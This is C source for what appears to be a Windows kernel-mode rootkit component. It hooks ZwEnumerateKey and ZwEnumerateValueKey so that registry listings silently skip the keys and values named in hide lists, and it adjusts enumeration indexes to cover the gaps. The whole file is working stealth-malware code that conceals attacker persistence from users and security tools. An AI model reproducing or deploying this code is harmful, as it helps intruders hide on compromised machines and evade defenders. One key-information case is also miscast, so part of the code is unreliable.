#include <ntddk.h>
#include "reg.h"

typedef unsigned char BYTE, *PBYTE;
typedef unsigned char BOOL;

WCHAR *RegKeyToHide[128];
WCHAR *RegValueToHide[128];
ULONG NbRegKeyToHide=0;
ULONG NbRegValueToHide=0;

ZWENUMERATEKEY ZwEnumerateKeyAddress = NULL;
ZWENUMERATEVALUEKEY ZwEnumerateValueKeyAddress = NULL;

/*
    ZwEnumerateValueKey & ZwEnumerateKey Hook.
    
    As for file, we get the offset of the name of the key, so we can install only
    1 hook routine per API.
    
    I did'nt find any correct method by searching the web to hook ZwEnumerateKey
    and ZwEnumerateValueKey.
    With some tests, we notice that ZEK and ZEVK are called lots of time,
    with an incrementation of the Index.
    So the idea here is to create our Index, and to control the gap with the real one.

*/

ULONG CurrentIndex=0;
ULONG NbHiddenKeys=0;

NTSTATUS ZwEnumerateKeyHook(
	IN HANDLE KeyHandle,
	IN ULONG Index,
	IN KEY_INFORMATION_CLASS KeyInformationClass,
	OUT PVOID KeyInformation,
	IN ULONG Length,
	OUT PULONG ResultLength
)
{
    NTSTATUS status;
    PBYTE key;
    ULONG NameOffset;
    ULONG NameSizeOffset;
    WCHAR *KeyNamePtr;
    PULONG KeyNameLength;
    ULONG i;

    if( Index != (CurrentIndex-NbHiddenKeys) ) {
       // the gap changed, this must be a new listing.
       CurrentIndex = Index;
       NbHiddenKeys = 0;
    }
    
    // we call the original API with OUR Index
    status = ZwEnumerateKeyAddress(
	   KeyHandle,
	   CurrentIndex,
	   KeyInformationClass,
	   KeyInformation,
	   Length,
	   ResultLength);   
       
    if( !NT_SUCCESS(status) ) 
       return status;  
       
    key = KeyInformation;   
    
    switch( KeyInformationClass )
    {   
        case KeyBasicInformation:
             NameOffset = ((ULONG)&(((PKEY_BASIC_INFORMATION)key)->Name)) - ((ULONG)key);
             NameSizeOffset = ((ULONG)&(((PKEY_BASIC_INFORMATION)key)->NameLength)) 
                               - ((ULONG)key);                  
             break;

        case KeyNodeInformation:
             NameOffset = ((ULONG)&(((PKEY_NODE_INFORMATION)key)->Name)) - ((ULONG)key);
             NameSizeOffset = ((ULONG)&(((PKEY_NODE_INFORMATION)key)->NameLength)) 
                               - ((ULONG)key);                             
             break;       
             
        case KeyNameInformation:
             NameOffset = ((ULONG)&(((PKEY_VALUE_FULL_INFORMATION)key)->Name)) - ((ULONG)key);
             NameSizeOffset = ((ULONG)&(((PKEY_VALUE_FULL_INFORMATION)key)->NameLength)) 
                               - ((ULONG)key);                    
            break;                   
        
        default:
             // don't filter this call
             return status;      
    }   
     
     
    KeyNamePtr = (WCHAR*)((PBYTE)key + NameOffset);
    KeyNameLength = (PULONG) ((PBYTE)key + NameSizeOffset);   
    
    if( KeyNamePtr == NULL )
       return status;
    
    for( i=0; i<NbRegKeyToHide; i++) {      
       if( *KeyNameLength == wcslen(RegKeyToHide[i])*2&&
           !memcmp(KeyNamePtr,RegKeyToHide[i],*KeyNameLength)) 
       {
          // this is a key to hide
          CurrentIndex++;
          // we call recursively our function :)
          status = ZwEnumerateKey(
              KeyHandle,
	          CurrentIndex,
	          KeyInformationClass,
	          KeyInformation,
	          Length,
	          ResultLength);
	      // increment HiddenKey AFTER the recursive call otherwise the precedent 
          // call would be wrong.    
	      NbHiddenKeys++;    
          return status;
       }    
    } 
    CurrentIndex++; 
    return status;  
}


ULONG vCurrentIndex=0;
ULONG NbHiddenValues=0;
BOOL ableToInit=TRUE;

NTSTATUS ZwEnumerateValueKeyHook(
    IN HANDLE KeyHandle,
    IN ULONG Index,
    IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT PVOID KeyValueInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
)
{
    NTSTATUS status;
    PBYTE value;
    ULONG NameOffset;
    ULONG NameSizeOffset;
    WCHAR *ValueNamePtr;
    PULONG ValueNameLength;
    ULONG i,size;
    
    if( ableToInit && Index!=(vCurrentIndex-NbHiddenValues) ) {
       vCurrentIndex = Index;
       NbHiddenValues = 0;
    }
    

    
    status = ZwEnumerateValueKeyAddress(
       KeyHandle,
       vCurrentIndex,
       KeyValueInformationClass,
       KeyValueInformation,
       Length,
       ResultLength);   
       
    if( !NT_SUCCESS(status) ) 
       return status;  
       
    value = KeyValueInformation;   
    
    switch( KeyValueInformationClass )
    {   
        case KeyValueBasicInformation:
             NameOffset = ((ULONG)&(((PKEY_VALUE_BASIC_INFORMATION)value)->Name)) - ((ULONG)value);
             NameSizeOffset = ((ULONG)&(((PKEY_VALUE_BASIC_INFORMATION)value)->NameLength)) 
                               - ((ULONG)value);      
             break;

        case KeyValueFullInformation:
             NameOffset = ((ULONG)&(((PKEY_VALUE_FULL_INFORMATION)value)->Name)) - ((ULONG)value);
             NameSizeOffset = ((ULONG)&(((PKEY_VALUE_FULL_INFORMATION)value)->NameLength)) 
                               - ((ULONG)value);           
             break;       

       default:
             return status;      
    }   
     
    ValueNamePtr = (WCHAR*)((PBYTE)value + NameOffset);
    ValueNameLength = (PULONG) ((PBYTE)value + NameSizeOffset);   

    if( ValueNamePtr == NULL )
       return status;

    for( i=0; i<NbRegValueToHide; i++) {            
       if( *ValueNameLength == wcslen(RegValueToHide[i])*2 &&
           !memcmp(ValueNamePtr,RegValueToHide[i],*ValueNameLength)) {       
          // value to hide ! :)
          
          // this is a value to hide
          vCurrentIndex++;
          // the same recursive call
          ableToInit = FALSE;
          status = ZwEnumerateValueKey(
             KeyHandle,
             vCurrentIndex,
             KeyValueInformationClass,
             KeyValueInformation,
             Length,
             ResultLength); 
          ableToInit = TRUE;
	      NbHiddenValues++;    
          return status; 
       }   
    } 
    vCurrentIndex++;
    return status;  
}
